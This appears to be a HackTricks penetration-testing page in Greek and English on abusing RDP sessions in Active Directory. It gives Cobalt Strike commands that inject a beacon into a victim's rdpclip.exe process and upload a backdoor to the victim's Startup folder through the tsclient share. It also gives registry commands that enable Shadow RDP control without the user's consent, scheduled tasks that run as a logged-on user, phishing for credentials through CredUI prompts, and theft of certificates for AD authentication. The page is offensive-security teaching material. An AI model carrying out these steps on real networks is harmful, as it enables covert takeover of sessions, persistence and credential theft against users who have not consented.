# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Αν η **εξωτερική ομάδα** έχει **RDP access** σε οποιονδήποτε **υπολογιστή** στο τρέχον domain, ένας **επιτιθέμενος** θα μπορούσε να **παραβιάσει αυτόν τον υπολογιστή και να περιμένει τον χρήστη**.

Μόλις ο χρήστης συνδεθεί μέσω RDP, ο **επιτιθέμενος μπορεί να μεταβεί στη συνεδρία του χρήστη** και να καταχραστεί τα δικαιώματά του στο εξωτερικό domain.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Δείτε **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Αν ένας χρήστης συνδεθεί μέσω **RDP into a machine** όπου ένας **attacker** είναι **waiting** για αυτόν, ο attacker θα είναι σε θέση να **inject a beacon in the RDP session of the user** και αν ο **victim mounted his drive** όταν συνδέεται μέσω RDP, ο **attacker could access it**.

Σε αυτή την περίπτωση μπορείτε απλά να **compromise** τον **victims** **original computer** γράφοντας ένα **backdoor** στον **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Εάν είστε **local admin** σε έναν host όπου το θύμα ήδη έχει μια **active RDP session**, ενδέχεται να μπορείτε να **view/control that desktop without stealing the password or dumping LSASS**.

Αυτό εξαρτάται από την πολιτική **Remote Desktop Services shadowing** που αποθηκεύεται σε:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Interesting values:

- `0`: Απενεργοποιημένο
- `1`: `EnableInputNotify` (έλεγχος, απαιτείται έγκριση χρήστη)
- `2`: `EnableInputNoNotify` (έλεγχος, **χωρίς έγκριση χρήστη**)
- `3`: `EnableNoInputNotify` (μόνο προβολή, απαιτείται έγκριση χρήστη)
- `4`: `EnableNoInputNoNotify` (μόνο προβολή, **χωρίς έγκριση χρήστη**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν ένας προνομιούχος χρήστης που συνδέθηκε μέσω RDP άφησε ξεκλείδωτη την επιφάνεια εργασίας, συνεδρία KeePass, κονσόλα MMC, browser session, ή admin shell ανοιχτό.

## Scheduled Tasks As Logged-On User

If you are **local admin** and the target user is **currently logged on**, Task Scheduler can start code **ως αυτόν τον χρήστη χωρίς τον κωδικό του**.

Αυτό μετατρέπει την υπάρχουσα συνεδρία σύνδεσης του θύματος σε ένα execution primitive:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
- Αν ο χρήστης **δεν είναι συνδεδεμένος**, τα Windows συνήθως απαιτούν τον κωδικό πρόσβασης για να δημιουργήσουν μια εργασία που τρέχει ως αυτός.
- Αν ο χρήστης **είναι συνδεδεμένος**, η εργασία μπορεί να επαναχρησιμοποιήσει το υπάρχον logon context.
- Αυτός είναι ένας πρακτικός τρόπος για να εκτελέσετε GUI ενέργειες ή να εκκινήσετε binaries μέσα στη συνεδρία του θύματος χωρίς να αγγίξετε το LSASS.

## CredUI Prompt Abuse From the Victim Session

Μόλις μπορείτε να εκτελέσετε **μέσα στην interactive desktop του θύματος** (για παράδειγμα μέσω **Shadow RDP** ή **μιας scheduled task που τρέχει ως εκείνος ο χρήστης**), μπορείτε να εμφανίσετε ένα **πραγματικό Windows credential prompt** χρησιμοποιώντας τις CredUI APIs και να συλλέξετε τα credentials που εισάγει το θύμα.

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Τυπική ροή:

1. Εκκινήστε ένα binary στη συνεδρία του θύματος.
2. Εμφανίστε ένα domain-authentication prompt που ταιριάζει με το τρέχον branding του domain.
3. Ξεπακετάρετε το επιστρεφόμενο auth buffer.
4. Επαληθεύστε τα παρεχόμενα credentials και, προαιρετικά, συνεχίστε να εμφανίζετε το prompt μέχρι να εισαχθούν έγκυρα credentials.

Αυτό είναι χρήσιμο για **on-host phishing** επειδή το prompt αποδίδεται από τις τυπικές Windows APIs αντί για μια ψεύτικη HTML φόρμα.

## Requesting a PFX In the Victim Context

Η ίδια **scheduled-task-as-user** primitive μπορεί να χρησιμοποιηθεί για να ζητήσει ένα **certificate/PFX ως ο συνδεδεμένος χρήστης-θύμα**. Αυτό το πιστοποιητικό μπορεί αργότερα να χρησιμοποιηθεί για **AD authentication** ως εκείνος ο χρήστης, αποφεύγοντας εντελώς την κλοπή κωδικού.

High-level flow:

1. Αποκτήστε **local admin** σε έναν host όπου το θύμα είναι συνδεδεμένο.
2. Τρέξτε τη λογική εγγραφής/εξαγωγής ως το θύμα χρησιμοποιώντας μια **scheduled task**.
3. Εξάγετε το προκύπτον **PFX**.
4. Χρησιμοποιήστε το PFX για PKINIT / certificate-based AD authentication.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
